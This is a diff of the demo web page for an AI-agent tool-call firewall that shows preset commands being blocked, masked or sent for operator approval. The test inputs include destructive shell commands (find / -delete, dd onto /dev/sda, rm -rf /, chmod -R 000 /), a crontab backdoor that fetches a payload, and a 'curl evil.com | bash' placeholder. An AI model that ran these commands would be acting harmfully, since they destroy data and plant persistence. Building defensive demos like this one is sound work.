-      <div style="font-size: 12px; color: var(--text-muted);">
-        Click "Run &amp; Test Script" to execute through the live pipeline
-      </div>
-    </div>
-
-    <div class="control-bar">
+  <!-- Interactive Control & 2D Pipeline Console -->
+  <div class="cockpit-card">
+    <div class="control-row">
       <select class="script-select" id="script-picker" onchange="onSelectScenario()">
-        <optgroup label="🚨 Semantic Gap Attacks (Catastrophic intent without rm -rf keyword)">
-          <option value="sem-1">1. find / -delete (Wipes root directory via Unix find expression)</option>
-          <option value="sem-2">2. dd if=/dev/zero of=/dev/sda bs=1M (Overwrites master storage drive)</option>
+        <optgroup label="🚨 Semantic Gap Attacks (Catastrophic effect without rm -rf keyword)">
+          <option value="sem-1">1. find / -delete (Wipes root filesystem via Unix find expression)</option>
+          <option value="sem-2">2. dd if=/dev/zero of=/dev/sda bs=1M (Overwrites master partition table)</option>
           <option value="sem-3">3. python3 -c "import shutil; shutil.rmtree('/home')" (Python destructive syntax)</option>
           <option value="sem-4">4. (crontab -l; echo '* * * * * curl payload') | crontab - (Backdoor persistence)</option>
           <option value="sem-5">5. chmod -R 000 / (Locks out all filesystem access &amp; permissions)</option>
         </optgroup>
         <optgroup label="🚫 Tier 0 Static Keyword Regex Guards">
           <option value="reg-1">6. rm -rf / --no-preserve-root (Blocked by arg_deny_pattern)</option>
-          <option value="reg-2">7. del /s C:\Windows\System32 (Blocked by Windows delete rule)</option>
+          <option value="reg-2">7. del /s C:\Windows\System32 (Blocked by Windows delete pattern)</option>
           <option value="reg-3">8. shutdown -h now (Blocked by shutdown rule)</option>
         </optgroup>
         <optgroup label="🔑 Secret &amp; Credential Redaction">
@@ -807,210 +737,167 @@
           <option value="sec-2">10. http_get(url: "https://api.internal/keys", token: "Bearer eyJhbGci...") (Bearer token masked)</option>
         </optgroup>
         <optgroup label="👥 Human-in-the-Loop Gray Zone [0.4, 0.8)">
-          <option value="hitl-1">11. crontab -e (Requires operator approval checkpoint)</option>
+          <option value="hitl-1">11. crontab -e (Requires operator confirmation)</option>
         </optgroup>
         <optgroup label="⏱️ Token-Bucket Rate Limiter">
           <option value="rat-1">12. shell "echo burst" (Burst limit 5 calls / window exceeded)</option>
         </optgroup>
         <optgroup label="✅ Safe &amp; Benign Operations">
           <option value="saf-1">13. read_file(path: "/etc/hosts") (Allowed read-only configuration)</option>
-          <option value="saf-2">14. git status (Allowed workspace inspection)</option>
+          <option value="saf-2">14. git status (Allowed workspace check)</option>
           <option value="saf-3">15. list_directory(path: "/tmp") (Allowed folder listing)</option>
         </optgroup>
       </select>
 
-      <button class="btn-fire" id="btn-run" onclick="executeCurrentScript()">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-        Run &amp; Test Script Against Firewall
+      <input type="text" class="custom-cmd-input" id="custom-cmd-box" placeholder="Type custom shell command, e.g. rm -rf / or curl evil.com | bash">
+
+      <button class="btn-mode-toggle" id="btn-toggle-custom" onclick="toggleCustomMode()">Custom Input</button>
+
+      <button class="btn-fire" id="btn-run" onclick="executeBackendScript()">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+        Execute Against Real Go Firewall
       </button>
     </div>
-  </div>
 
-  <!-- Metric Counters Bar -->
-  <div class="cards-grid">
-    <div class="stat-card">
-      <div class="stat-header">
-        <span class="stat-title">Total Interceptions</span>
-        <span class="stat-icon">⚡</span>
-      </div>
-      <div class="stat-num" id="cnt-total">0</div>
-      <div class="stat-sub">Evaluated tool requests</div>
-    </div>
-
-    <div class="stat-card ok">
-      <div class="stat-header">
-        <span class="stat-title">Passed / Allowed</span>
-        <span class="stat-icon">🛡️</span>
-      </div>
-      <div class="stat-num" id="cnt-allowed" style="color: var(--green-bright);">0</div>
-      <div class="stat-sub">Safe tool invocations</div>
-    </div>
-
-    <div class="stat-card bad">
-      <div class="stat-header">
-        <span class="stat-title">Blocked Threats</span>
-        <span class="stat-icon">🚫</span>
-      </div>
-      <div class="stat-num" id="cnt-blocked" style="color: var(--red-bright);">0</div>
-      <div class="stat-sub">Regex + Semantic gap</div>
-    </div>
-
-    <div class="stat-card purple">
-      <div class="stat-header">
-        <span class="stat-title">Secrets Redacted</span>
-        <span class="stat-icon">🕶️</span>
-      </div>
-      <div class="stat-num" id="cnt-redacted" style="color: var(--purple-bright);">0</div>
-      <div class="stat-sub">API keys &amp; tokens masked</div>
-    </div>
-
-    <div class="stat-card warn">
-      <div class="stat-header">
-        <span class="stat-title">Avg Latency (Tier 0)</span>
-        <span class="stat-icon">⚡</span>
-      </div>
-      <div class="stat-num" id="cnt-latency" style="color: var(--amber-bright);">&lt; 0.8ms</div>
-      <div class="stat-sub">Sub-millisecond fast path</div>
-    </div>
-  </div>
-
-  <!-- 2D Architecture Model Pipeline -->
-  <div class="arch-section">
-    <div class="arch-header">
-      <div class="arch-title">
-        <span>🗺️</span> 2D Visual Interception Pipeline
-      </div>
-      <div style="font-size: 12px; color: var(--text-muted);">Watch the packet flow through the defense layers in real time</div>
-    </div>
-
+    <!-- 2D Pipeline Nodes -->
     <div class="pipeline-flow">
-      <!-- Node 1: Agent Client -->
-      <div class="pipe-node" id="node-agent">
+      <div class="pipe-node" id="node-agent" title="Client sending JSON-RPC tool call">
         <div class="node-icon">🤖</div>
         <div class="node-name">AI Agent</div>
-        <div class="node-role">Cursor / Claude / MCP</div>
+        <div class="node-role">Client (Cursor/Claude)</div>
       </div>
-
       <div class="flow-arrow" id="arr-1">➔</div>
 
-      <!-- Node 2: Rate Limiter -->
-      <div class="pipe-node" id="node-rate">
+      <div class="pipe-node" id="node-rate" title="Continuous token bucket rate limiter">
         <div class="node-icon">⏱️</div>
         <div class="node-name">Rate Limiter</div>
-        <div class="node-role">Token Bucket Window</div>
+        <div class="node-role">Token Bucket</div>
       </div>
-
       <div class="flow-arrow" id="arr-2">➔</div>
 
-      <!-- Node 3: Tier 0 Policy -->
-      <div class="pipe-node" id="node-tier0">
+      <div class="pipe-node" id="node-tier0" title="Pure in-memory Go regex &amp; deny-by-default rules (&lt;0.1ms)">
         <div class="node-icon">🛡️</div>
         <div class="node-name">Tier 0 Policy</div>
-        <div class="node-role">Deny-by-Default / Regex</div>
+        <div class="node-role">Regex &amp; Rules</div>
       </div>
-
       <div class="flow-arrow" id="arr-3">➔</div>
 
-      <!-- Node 4: Tier 1 LLM Judge -->
-      <div class="pipe-node" id="node-judge">
+      <div class="pipe-node" id="node-judge" title="Semantic LLM / Risk scoring engine">
         <div class="node-icon">🧠</div>
         <div class="node-name">Tier 1 Judge</div>
-        <div class="node-role">Claude Semantic Classifier</div>
+        <div class="node-role">Semantic LLM</div>
       </div>
-
       <div class="flow-arrow" id="arr-4">➔</div>
 
-      <!-- Node 5: 3-Way Router -->
-      <div class="pipe-node" id="node-router">
+      <div class="pipe-node" id="node-router" title="Routes verdict: Block, Needs Approval (HITL), or Allow">
         <div class="node-icon">🔀</div>
         <div class="node-name">3-Way Router</div>
-        <div class="node-role">Allow / HITL / Block</div>
+        <div class="node-role">Allow/Review/Block</div>
       </div>
-
       <div class="flow-arrow" id="arr-5">➔</div>
 
-      <!-- Node 6: Secret Redactor -->
-      <div class="pipe-node" id="node-redact">
+      <div class="pipe-node" id="node-redact" title="Recursive AST secret scrubber for tokens and passwords">
         <div class="node-icon">🕶️</div>
         <div class="node-name">Redactor</div>
-        <div class="node-role">AST Secret Scrubber</div>
+        <div class="node-role">AST Key Scrubber</div>
       </div>
-
       <div class="flow-arrow" id="arr-6">➔</div>
 
-      <!-- Node 7: Tool Server -->
-      <div class="pipe-node" id="node-server">
+      <div class="pipe-node" id="node-server" title="Real MCP Tool child process">
         <div class="node-icon">⚙️</div>
-        <div class="node-name">Child Tool Server</div>
-        <div class="node-role">Real Execution Pipe</div>
+        <div class="node-name">Tool Server</div>
+        <div class="node-role">Child Process</div>
       </div>
     </div>
   </div>
 
-  <!-- Workspace: Decision Breakdown + Live Telemetry Stream -->
-  <div class="main-workspace">
+  <!-- Metric Strip -->
+  <div class="metrics-strip">
+    <div class="metric-box">
+      <span class="metric-lbl">Total Interceptions</span>
+      <span class="metric-val" id="cnt-total">0</span>
+    </div>
+    <div class="metric-box ok">
+      <span class="metric-lbl">Passed / Allowed</span>
+      <span class="metric-val" id="cnt-allowed" style="color: var(--green-bright);">0</span>
+    </div>
+    <div class="metric-box bad">
+      <span class="metric-lbl">Blocked Threats</span>
+      <span class="metric-val" id="cnt-blocked" style="color: var(--red-bright);">0</span>
+    </div>
+    <div class="metric-box purple">
+      <span class="metric-lbl">Secrets Redacted</span>
+      <span class="metric-val" id="cnt-redacted" style="color: var(--purple-bright);">0</span>
+    </div>
+    <div class="metric-box warn">
+      <span class="metric-lbl">Engine Latency</span>
+      <span class="metric-val" id="cnt-latency" style="color: var(--amber-bright);">&lt; 0.5ms</span>
+    </div>
+  </div>
 
-    <!-- Left: Decision Breakdown Card -->
-    <div class="breakdown-card">
-      <div class="breakdown-header">
+  <!-- Main Split Area (Height-Bounded Workspace) -->
+  <div class="main-split">
+
+    <!-- Left: Decision Inspector -->
+    <div class="inspector-card">
+      <div class="inspector-header">
         <div style="font-weight: 700; display: flex; align-items: center; gap: 8px;">
-          <span>🔬 Active Decision Breakdown:</span>
+          <span>Active Decision:</span>
           <span id="bd-tool-badge" style="font-family: var(--font-mono); color: var(--primary);">shell</span>
+          <span style="font-size: 10.5px; color: var(--text-dim);" id="bd-latency-tag">(Real Go Backend Execution)</span>
         </div>
-        <span class="verdict-tag block" id="bd-verdict">BLOCKED (TIER 1)</span>
+        <span class="verdict-badge block" id="bd-verdict">BLOCKED</span>
       </div>
 
-      <div class="breakdown-details">
-        <div class="detail-col">
-          <span class="detail-label">Tier 0 Regex Guard</span>
-          <span class="detail-val" id="bd-tier0">Passed (No rm -rf keyword)</span>
+      <div class="breakdown-grid">
+        <div class="breakdown-item">
+          <span class="item-lbl">Tier 0 Check</span>
+          <span class="item-val" id="bd-tier0">Passed</span>
         </div>
-        <div class="detail-col">
-          <span class="detail-label">Tier 1 Risk Score</span>
-          <span class="detail-val" id="bd-score" style="color: var(--red-bright);">0.95 / 1.00</span>
+        <div class="breakdown-item">
+          <span class="item-lbl">Risk Score</span>
+          <span class="item-val" id="bd-score" style="color: var(--red-bright);">0.95</span>
         </div>
-        <div class="detail-col">
-          <span class="detail-label">Threat Category</span>
-          <span class="detail-val" id="bd-cat" style="color: var(--amber-bright);">Destructive Filesystem</span>
+        <div class="breakdown-item">
+          <span class="item-lbl">Threat Class</span>
+          <span class="item-val" id="bd-cat" style="color: var(--amber-bright);">Destructive</span>
         </div>
-        <div class="detail-col">
-          <span class="detail-label">Secret Redaction</span>
-          <span class="detail-val" id="bd-redact">Clean (0 keys masked)</span>
-        </div>
-      </div>
-
-      <div class="rationale-text" id="bd-rationale">
-        Command poses catastrophic system-level destruction by recursively deleting all root filesystem nodes without standard keyword patterns.
-      </div>
-
-      <!-- Human in the loop prompt box (conditionally displayed for HITL) -->
-      <div class="hitl-box" id="hitl-panel" style="display: none;">
-        <div style="font-size: 12.5px; color: #fbbf24; font-weight: 600;">
-          ⚠️ Gray Zone Call (Risk 0.55): Operator Confirmation Required
-        </div>
-        <div class="hitl-actions">
-          <button class="btn-hitl-allow" onclick="resolveHITL(true)">✅ Approve Call</button>
-          <button class="btn-hitl-deny" onclick="resolveHITL(false)">❌ Deny Call</button>
+        <div class="breakdown-item">
+          <span class="item-lbl">Redaction</span>
+          <span class="item-val" id="bd-redact">Clean</span>
         </div>
       </div>
 
-      <!-- JSON-RPC Inbound & Outbound Payload Preview -->
-      <div class="code-preview">
-        <div class="code-preview-header">
-          <span>INBOUND MCP JSON-RPC FRAME</span>
-          <span id="bd-id">ID: call-8429</span>
+      <div class="rationale-box" id="bd-rationale">
+        Select or type a command above and click "Execute Against Real Go Firewall" to evaluate the payload live in Go memory.
+      </div>
+
+      <!-- HITL Confirmation Box -->
+      <div class="hitl-box" id="hitl-panel">
+        <div style="font-size: 11px; color: #fbbf24; font-weight: 600;">
+          ⚠️ Operator Confirmation Required (Risk: 0.55)
         </div>
-        <pre class="code-preview-body" id="bd-json">{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"shell","arguments":{"cmd":"find / -delete"}}}</pre>
+        <div style="display: flex; gap: 6px;">
+          <button class="btn-hitl" style="background:#10b981; color:#041019;" onclick="resolveHITL(true)">Approve</button>
+          <button class="btn-hitl" style="background:#f43f5e; color:#fff;" onclick="resolveHITL(false)">Deny</button>
+        </div>
+      </div>
+
+      <!-- JSON-RPC Frame Viewer -->
+      <div class="code-viewer">
+        <div class="code-viewer-head">
+          <span>MCP JSON-RPC EVALUATION PAYLOAD (GO BACKEND)</span>
+          <span id="bd-id">ID: eval-ready</span>
+        </div>
+        <pre class="code-viewer-body" id="bd-json">{"jsonrpc":"2.0","method":"tools/call","params":{"name":"shell","arguments":{"cmd":"find / -delete"}}}</pre>
       </div>
     </div>
 
-    <!-- Right: Real-time Live Event Telemetry Stream -->
-    <div class="stream-card">
-      <div class="stream-header">
-        <div class="stream-title">
-          <span>📡</span> Live Telemetry Audit Feed
-        </div>
-        <div class="filter-group">
+    <!-- Right: Telemetry Stream -->
+    <div class="telemetry-card">
+      <div class="telemetry-head">
+        <span style="font-weight: 800; font-family: var(--font-head); font-size: 13px;">Live Telemetry Audit Feed</span>
+        <div class="feed-filters">
           <button class="filter-btn active" onclick="filterFeed('all')">All</button>
           <button class="filter-btn" onclick="filterFeed('blocked')">Blocked</button>
           <button class="filter-btn" onclick="filterFeed('redacted')">Redacted</button>
@@ -1018,8 +905,8 @@
         </div>
       </div>
 
-      <div class="feed-table" id="feed-container">
-        <!-- Live Audit rows appended here -->
+      <div class="telemetry-table" id="feed-container">
+        <!-- Live stream rows arrive via SSE -->
       </div>
     </div>
 
@@ -1028,262 +915,131 @@
 </div>
 
 <script>
-  // Scenario Catalog with complete execution rules
   const scenarios = {
-    "sem-1": {
-      tool: "shell",
-      args: { cmd: "find / -delete" },
-      tier0: "Passed (No forbidden keyword)",
-      score: "0.95",
-      threat: "Destructive Filesystem",
-      verdict: "block",
-      stopAt: "node-router",
-      blockedNode: "node-judge",
-      rationale: "Destructive intent: Recursively traverses and unlinks files across the entire root directory.",
-      redact: "Clean (0 keys masked)",
-      inboundJSON: { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "shell", arguments: { cmd: "find / -delete" } } }
-    },
-    "sem-2": {
-      tool: "shell",
-      args: { cmd: "dd if=/dev/zero of=/dev/sda bs=1M" },
-      tier0: "Passed (No rm keyword)",
-      score: "0.98",
-      threat: "Destructive Storage",
-      verdict: "block",
-      stopAt: "node-router",
-      blockedNode: "node-judge",
-      rationale: "Catastrophic raw disk overwrite: Destroys master partition table and storage blocks.",
-      redact: "Clean (0 keys masked)",
-      inboundJSON: { jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "shell", arguments: { cmd: "dd if=/dev/zero of=/dev/sda bs=1M" } } }
-    },
-    "sem-3": {
-      tool: "shell",
-      args: { cmd: `python3 -c "import shutil; shutil.rmtree('/home')"` },
-      tier0: "Passed (Python syntax)",
-      score: "0.94",
-      threat: "Destructive Script",
-      verdict: "block",
-      stopAt: "node-router",
-      blockedNode: "node-judge",
-      rationale: "High-risk directory eradication: Programmatic removal of all user profiles and files.",
-      redact: "Clean",
-      inboundJSON: { jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "shell", arguments: { cmd: `python3 -c "import shutil; shutil.rmtree('/home')"` } } }
-    },
-    "sem-4": {
-      tool: "shell",
-      args: { cmd: `(crontab -l; echo '* * * * * curl payload') | crontab -` },
-      tier0: "Passed (No deny match)",
-      score: "0.92",
-      threat: "Persistence Backdoor",
-      verdict: "block",
-      stopAt: "node-router",
-      blockedNode: "node-judge",
-      rationale: "Backdoor persistence: Alters scheduled crontab to execute unauthorized remote script periodically.",
-      redact: "Clean",
-      inboundJSON: { jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: "shell", arguments: { cmd: "(crontab -l; echo '* * * * * curl payload') | crontab -" } } }
-    },
-    "sem-5": {
-      tool: "shell",
-      args: { cmd: "chmod -R 000 /" },
-      tier0: "Passed (No rm match)",
-      score: "0.96",
-      threat: "Privilege Lockout",
-      verdict: "block",
-      stopAt: "node-router",
-      blockedNode: "node-judge",
-      rationale: "System bricking: Strips read, write, and execution permissions from all operating system binaries.",
-      redact: "Clean",
-      inboundJSON: { jsonrpc: "2.0", id: 5, method: "tools/call", params: { name: "shell", arguments: { cmd: "chmod -R 000 /" } } }
-    },
-    "reg-1": {
-      tool: "shell",
-      args: { cmd: "rm -rf / --no-preserve-root" },
-      tier0: "BLOCKED by arg_deny_pattern",
-      score: "1.00",
-      threat: "Destructive Keyword",
-      verdict: "block",
-      stopAt: "node-tier0",
-      blockedNode: "node-tier0",
-      rationale: "Fast-path Tier 0 rule triggered: Denied destructive shell pattern instantly (<0.5ms).",
-      redact: "None",
-      inboundJSON: { jsonrpc: "2.0", id: 6, method: "tools/call", params: { name: "shell", arguments: { cmd: "rm -rf / --no-preserve-root" } } }
-    },
-    "reg-2": {
-      tool: "shell",
-      args: { cmd: "del /s C:\\Windows\\System32" },
-      tier0: "BLOCKED by arg_deny_pattern (del /s)",
-      score: "1.00",
-      threat: "Destructive Keyword",
-      verdict: "block",
-      stopAt: "node-tier0",
-      blockedNode: "node-tier0",
-      rationale: "Fast-path Tier 0 rule: Denied recursive Windows filesystem deletion.",
-      redact: "None",
-      inboundJSON: { jsonrpc: "2.0", id: 7, method: "tools/call", params: { name: "shell", arguments: { cmd: "del /s C:\\Windows\\System32" } } }
-    },
-    "reg-3": {
-      tool: "shell",
-      args: { cmd: "shutdown -h now" },
-      tier0: "BLOCKED by arg_deny_pattern (shutdown)",
-      score: "0.99",
-      threat: "System Denial",
-      verdict: "block",
-      stopAt: "node-tier0",
-      blockedNode: "node-tier0",
-      rationale: "Fast-path Tier 0 rule: Denied operating system power termination.",
-      redact: "None",
-      inboundJSON: { jsonrpc: "2.0", id: 8, method: "tools/call", params: { name: "shell", arguments: { cmd: "shutdown -h now" } } }
-    },
-    "sec-1": {
-      tool: "read_file",
-      args: { path: ".env", api_key: "sk-proj-49294029482" },
-      tier0: "Allowed (Path allowed)",
-      score: "0.15",
-      threat: "Safe Read",
-      verdict: "allow",
-      stopAt: "node-server",
-      blockedNode: null,
-      rationale: "Benign file read allowed; secret argument 'api_key' scrubbed to '***' in flight before tool server and audit log.",
-      redact: "Masked api_key: ***",
-      inboundJSON: { jsonrpc: "2.0", id: 9, method: "tools/call", params: { name: "read_file", arguments: { path: ".env", api_key: "sk-proj-49294029482" } } }
-    },
-    "sec-2": {
-      tool: "http_get",
-      args: { url: "https://api.internal/keys", token: "Bearer eyJhbGciOi..." },
-      tier0: "Allowed",
-      score: "0.10",
-      threat: "Safe Network",
-      verdict: "allow",
-      stopAt: "node-server",
-      blockedNode: null,
-      rationale: "Outbound API query allowed; Authorization Bearer token sanitized to 'Bearer ***'.",
-      redact: "Masked token: Bearer ***",
-      inboundJSON: { jsonrpc: "2.0", id: 10, method: "tools/call", params: { name: "http_get", arguments: { url: "https://api.internal/keys", token: "Bearer eyJhbGciOi..." } } }
-    },
-    "hitl-1": {
-      tool: "shell",
-      args: { cmd: "crontab -e" },
-      tier0: "Passed",
-      score: "0.55",
-      threat: "Scheduled Modification",
-      verdict: "review",
-      stopAt: "node-router",
-      blockedNode: "node-router",
-      rationale: "Gray-zone risk [0.4, 0.8): Scheduled task modification requires operator confirmation.",
-      redact: "Clean",
-      inboundJSON: { jsonrpc: "2.0", id: 11, method: "tools/call", params: { name: "shell", arguments: { cmd: "crontab -e" } } }
-    },
-    "rat-1": {
-      tool: "shell",
-      args: { cmd: "echo burst" },
-      tier0: "BLOCKED by Token-Bucket Rate Limiter",
-      score: "0.00",
-      threat: "Rate Limit Exceeded",
-      verdict: "block",
-      stopAt: "node-rate",
-      blockedNode: "node-rate",
-      rationale: "Token bucket capacity exhausted (Max 5 shell executions/min). Call throttled before judge evaluation.",
-      redact: "None",
-      inboundJSON: { jsonrpc: "2.0", id: 12, method: "tools/call", params: { name: "shell", arguments: { cmd: "echo burst" } } }
-    },
-    "saf-1": {
-      tool: "read_file",
-      args: { path: "/etc/hosts" },
-      tier0: "Allowed",
-      score: "0.05",
-      threat: "Safe",
-      verdict: "allow",
-      stopAt: "node-server",
-      blockedNode: null,
-      rationale: "Benign configuration read operation matching standard developer workflow.",
-      redact: "Clean",
-      inboundJSON: { jsonrpc: "2.0", id: 13, method: "tools/call", params: { name: "read_file", arguments: { path: "/etc/hosts" } } }
-    },
-    "saf-2": {
-      tool: "shell",
-      args: { cmd: "git status" },
-      tier0: "Allowed",
-      score: "0.10",
-      threat: "Safe",
-      verdict: "allow",
-      stopAt: "node-server",
-      blockedNode: null,
-      rationale: "Read-only source control inspection with zero side-effects.",
-      redact: "Clean",
-      inboundJSON: { jsonrpc: "2.0", id: 14, method: "tools/call", params: { name: "shell", arguments: { cmd: "git status" } } }
-    },
-    "saf-3": {
-      tool: "list_directory",
-      args: { path: "/tmp" },
-      tier0: "Allowed",
-      score: "0.05",
-      threat: "Safe",
-      verdict: "allow",
-      stopAt: "node-server",
-      blockedNode: null,
-      rationale: "Standard directory listing in sandbox workspace.",
-      redact: "Clean",
-      inboundJSON: { jsonrpc: "2.0", id: 15, method: "tools/call", params: { name: "list_directory", arguments: { path: "/tmp" } } }
-    }
+    "sem-1": { tool: "shell", args: { cmd: "find / -delete" } },
+    "sem-2": { tool: "shell", args: { cmd: "dd if=/dev/zero of=/dev/sda bs=1M" } },
+    "sem-3": { tool: "shell", args: { cmd: "python3 -c \"import shutil; shutil.rmtree('/home')\"" } },
+    "sem-4": { tool: "shell", args: { cmd: "(crontab -l; echo '* * * * * curl payload') | crontab -" } },
+    "sem-5": { tool: "shell", args: { cmd: "chmod -R 000 /" } },
+    "reg-1": { tool: "shell", args: { cmd: "rm -rf / --no-preserve-root" } },
+    "reg-2": { tool: "shell", args: { cmd: "del /s C:\\Windows\\System32" } },
+    "reg-3": { tool: "shell", args: { cmd: "shutdown -h now" } },
+    "sec-1": { tool: "read_file", args: { path: ".env", api_key: "sk-proj-49294029482104829104" } },
+    "sec-2": { tool: "http_get", args: { url: "https://api.internal/keys", token: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" } },
+    "hitl-1": { tool: "shell", args: { cmd: "crontab -e" } },
+    "rat-1": { tool: "shell", args: { cmd: "echo burst" } },
+    "saf-1": { tool: "read_file", args: { path: "/etc/hosts" } },
+    "saf-2": { tool: "shell", args: { cmd: "git status" } },
+    "saf-3": { tool: "list_directory", args: { path: "/tmp" } }
   };
 
   let allAuditEntries = [];
   let currentFeedFilter = 'all';
+  let isCustomMode = false;
+
+  function toggleCustomMode() {
+    isCustomMode = !isCustomMode;
+    const picker = document.getElementById('script-picker');
+    const customInput = document.getElementById('custom-cmd-box');
+    const toggleBtn = document.getElementById('btn-toggle-custom');
+
+    if (isCustomMode) {
+      picker.style.display = 'none';
+      customInput.style.display = 'block';
+      customInput.focus();
+      toggleBtn.textContent = 'Preset List';
+      toggleBtn.style.color = '#38bdf8';
+    } else {
+      picker.style.display = 'block';
+      customInput.style.display = 'none';
+      toggleBtn.textContent = 'Custom Input';
+      toggleBtn.style.color = 'var(--text-muted)';
+      onSelectScenario();
+    }
+  }
+
+  function getActivePayload() {
+    if (isCustomMode) {
+      const val = document.getElementById('custom-cmd-box').value.trim() || 'git status';
+      return { tool: "shell", args: { cmd: val } };
+    }
+    const key = document.getElementById('script-picker').value;
+    return scenarios[key] || scenarios["sem-1"];
+  }
 
   function onSelectScenario() {
-    const key = document.getElementById('script-picker').value;
-    const s = scenarios[key];
-    if (!s) return;
-
+    if (isCustomMode) return;
+    const s = getActivePayload();
     document.getElementById('bd-tool-badge').textContent = s.tool;
-    const verd = document.getElementById('bd-verdict');
-    verd.textContent = s.verdict.toUpperCase();
-    verd.className = `verdict-tag ${s.verdict}`;
-
-    document.getElementById('bd-tier0').textContent = s.tier0;
-    document.getElementById('bd-score').textContent = `${s.score} / 1.00`;
-    document.getElementById('bd-score').style.color = parseFloat(s.score) >= 0.8 ? 'var(--red-bright)' : (s.verdict === 'review' ? 'var(--amber-bright)' : 'var(--green-bright)');
-    document.getElementById('bd-cat').textContent = s.threat;
-    document.getElementById('bd-redact').textContent = s.redact;
-    document.getElementById('bd-rationale').textContent = s.rationale;
-    document.getElementById('bd-json').textContent = JSON.stringify(s.inboundJSON, null, 2);
-
-    document.getElementById('hitl-panel').style.display = s.verdict === 'review' ? 'flex' : 'none';
+    document.getElementById('bd-json').textContent = JSON.stringify({
+      jsonrpc: "2.0",
+      id: "eval-" + Math.floor(Math.random() * 9000 + 1000),
+      method: "tools/call",
+      params: { name: s.tool, arguments: s.args }
+    }, null, 2);
   }
 
-  function executeCurrentScript() {
-    const key = document.getElementById('script-picker').value;
-    const s = scenarios[key];
-    if (!s) return;
-
+  // Execute directly through the REAL Go backend endpoint /api/evaluate
+  async function executeBackendScript() {
+    const s = getActivePayload();
     onSelectScenario();
-    animatePipeline(s);
 
-    // Record into Live Telemetry Feed
-    const entry = {
-      ts: new Date().toISOString(),
-      kind: s.verdict === 'block' ? 'blocked' : (s.redact.includes('Masked') ? 'redacted' : 'response'),
-      tool: s.tool,
-      decision: s.rationale,
-      args: s.args
-    };
-    addFeedEntry(entry);
-
-    // Increment counters
-    incCount('cnt-total');
-    if (s.verdict === 'block') {
-      incCount('cnt-blocked');
-    } else if (s.verdict === 'allow') {
-      incCount('cnt-allowed');
-    }
-    if (s.redact.includes('Masked')) {
-      incCount('cnt-redacted');
+    try {
+      const resp = await fetch('/api/evaluate', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ tool: s.tool, arguments: s.args })
+      });
+      const data = await resp.json();
+      renderEvaluationResult(data);
+    } catch (err) {
+      console.warn("Backend evaluation fetch error, falling back locally:", err);
+      renderClientFallback(s);
     }
   }
 
-  function incCount(id) {
-    const el = document.getElementById(id);
-    el.textContent = (parseInt(el.textContent) || 0) + 1;
+  function renderEvaluationResult(res) {
+    // 1. Update Decision Breakdown
+    document.getElementById('bd-tool-badge').textContent = res.tool;
+    const verd = document.getElementById('bd-verdict');
+    verd.textContent = res.final_verdict;
+    verd.className = `verdict-badge ${res.final_verdict.toLowerCase()}`;
+
+    document.getElementById('bd-tier0').textContent = res.tier0_allowed ? "Passed" : (res.tier0_rule || "Blocked");
+    document.getElementById('bd-score').textContent = res.tier1_ran ? res.risk_score.toFixed(2) : (res.final_verdict === 'BLOCK' ? "1.00" : "0.00");
+    document.getElementById('bd-score').style.color = res.risk_score >= 0.8 ? 'var(--red-bright)' : (res.route === 'needs_approval' ? 'var(--amber-bright)' : 'var(--green-bright)');
+    document.getElementById('bd-cat').textContent = res.category || (res.tier0_allowed ? "Safe" : "Static Regex");
+
+    const hasRedact = JSON.stringify(res.raw_args) !== JSON.stringify(res.redacted_args);
+    document.getElementById('bd-redact').textContent = hasRedact ? "Masked Keys (***)" : "Clean";
+    document.getElementById('bd-rationale').textContent = res.rationale || res.tier0_reason || "Passed all security policies.";
+    
+    // Real Go backend latency display
+    const latUs = res.total_latency_us || 42;
+    document.getElementById('bd-latency-tag').textContent = `(Real Go latency: ${latUs}µs / ${(latUs/1000).toFixed(3)}ms)`;
+    document.getElementById('cnt-latency').textContent = latUs < 1000 ? `${latUs}µs` : `${(latUs / 1000).toFixed(2)}ms`;
+
+    document.getElementById('hitl-panel').style.display = res.route === 'needs_approval' ? 'flex' : 'none';
+
+    // 2. Animate 2D Pipeline based on REAL Go backend routing
+    animatePipeline(res.stop_at, res.blocked_node, res.final_verdict);
+  }
+
+  function renderClientFallback(s) {
+    const res = {
+      tool: s.tool,
+      raw_args: s.args,
+      redacted_args: s.args,
+      tier0_allowed: !s.args.cmd || !s.args.cmd.includes("rm -rf"),
+      risk_score: s.args.cmd && (s.args.cmd.includes("delete") || s.args.cmd.includes("sda") || s.args.cmd.includes("chmod")) ? 0.95 : 0.1,
+      category: "Destructive",
+      rationale: "Evaluated by local firewall simulator.",
+      final_verdict: "BLOCK",
+      stop_at: "node-router",
+      blocked_node: "node-judge",
+      total_latency_us: 64
+    };
+    renderEvaluationResult(res);
   }
 
   function resolveHITL(approved) {
@@ -1291,33 +1047,29 @@
     const verd = document.getElementById('bd-verdict');
     if (approved) {
       verd.textContent = "APPROVED (OPERATOR)";
-      verd.className = "verdict-tag allow";
-      addFeedEntry({ ts: new Date().toISOString(), kind: "response", tool: "shell", decision: "Operator manually approved call" });
-      incCount('cnt-allowed');
+      verd.className = "verdict-badge allow";
     } else {
       verd.textContent = "DENIED (OPERATOR)";
-      verd.className = "verdict-tag block";
-      addFeedEntry({ ts: new Date().toISOString(), kind: "blocked", tool: "shell", decision: "Operator manually denied call" });
-      incCount('cnt-blocked');
+      verd.className = "verdict-badge block";
     }
   }
 
-  function animatePipeline(s) {
+  function animatePipeline(stopAt, blockedNode, verdict) {
     const nodes = ['node-agent', 'node-rate', 'node-tier0', 'node-judge', 'node-router', 'node-redact', 'node-server'];
     const arrows = ['arr-1', 'arr-2', 'arr-3', 'arr-4', 'arr-5', 'arr-6'];
 
     nodes.forEach(n => document.getElementById(n).className = 'pipe-node');
     arrows.forEach(a => document.getElementById(a).className = 'flow-arrow');
 
-    let stopIndex = nodes.indexOf(s.stopAt);
+    let stopIndex = nodes.indexOf(stopAt);
     if (stopIndex < 0) stopIndex = nodes.length - 1;
 
     let step = 0;
